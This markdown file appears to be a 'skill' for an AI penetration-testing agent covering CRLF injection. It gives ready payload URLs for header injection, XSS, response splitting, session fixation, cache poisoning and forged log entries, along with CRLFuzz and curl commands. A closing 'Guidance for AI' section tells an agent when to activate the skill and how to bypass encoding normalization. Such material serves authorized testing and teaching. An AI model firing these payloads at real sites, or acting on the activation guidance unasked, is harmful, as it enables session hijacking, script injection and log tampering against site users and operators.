# CRLF Injection Skill

## Goal

Identify and exploit CRLF (Carriage Return Line Feed) injection vulnerabilities for HTTP response splitting and header injection.

## Methodology

1. **Identify Reflection Points:** Find parameters reflected in HTTP headers (redirects, Set-Cookie)
2. **Inject CRLF Characters:** Insert `%0d%0a` (URL-encoded `\r\n`) to split headers
3. **Inject Custom Headers:** Add malicious headers after the split
4. **Escalate Attack:** Chain with XSS, cache poisoning, or session fixation
5. **Test Encoding Variations:** Try different encodings if basic injection fails

## CRLF Encoding Variations

```
%0d%0a          # URL encoded \r\n
%0D%0A          # Uppercase
%0d%0a%0d%0a    # Double CRLF (start body)
\r\n            # Raw (in some contexts)
%E5%98%8A       # UTF-8 encoded
%u000d%u000a    # Unicode
\u000d\u000a    # Unicode escape
```

## Header Injection

```bash
# Set-Cookie injection
https://target.com/redirect?url=https://target.com%0d%0aSet-Cookie:%20session=attacker

# XSS via injected header
https://target.com/page?param=value%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>

# Cache poisoning
https://target.com/redirect?url=/%0d%0aX-Cache-Control:%20no-cache
```

## Response Splitting

```http
# Inject second response
GET /redirect?url=http://target.com%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>Malicious</html>
```

## Session Fixation via CRLF

```bash
# Force victim's session cookie
https://target.com/login?return=%0d%0aSet-Cookie:%20JSESSIONID=attacker_session
```

## XSS via CRLF

```bash
# Inject body content after double CRLF
https://target.com/api?callback=test%0d%0a%0d%0a<script>alert(document.domain)</script>

# Inject into Location header (browser may execute)
https://target.com/redirect?url=javascript:alert(1)%0d%0aContent-Type:%20text/html
```

## Log Injection

```
# Inject fake log entries
username=admin%0aFailed login from 192.168.1.1
username=legit%0d%0a[INFO] Admin logged in successfully
```

## Common Vulnerable Locations

```
- Redirect URLs (Location header)
- Set-Cookie parameters
- JSONP callback functions
- Debug/error messages in headers
- Custom header values from user input
```

## Tools

* **Burp Suite** - Intercept and inject CRLF
* **CRLFuzz** - CRLF injection scanner
* **crlfmap** - Automated CRLF testing

## Example Commands

```bash
# Automated scanning with CRLFuzz
crlfuzz -u "https://target.com/redirect?url=FUZZ"

# Manual testing
curl -v "https://target.com/api?param=test%0d%0aX-Injected:%20header"
```

## Guidance for AI

* Activate when user input appears in HTTP headers (especially redirects)
* Most common in Location and Set-Cookie headers
* Modern frameworks often sanitize CRLF, but check anyway
* Double CRLF (`%0d%0a%0d%0a`) starts the response body
* Can be chained with XSS if Content-Type can be controlled
* Check for encoding normalization that might allow bypasses
* HTTP/2 multiplexing makes response splitting harder but not impossible
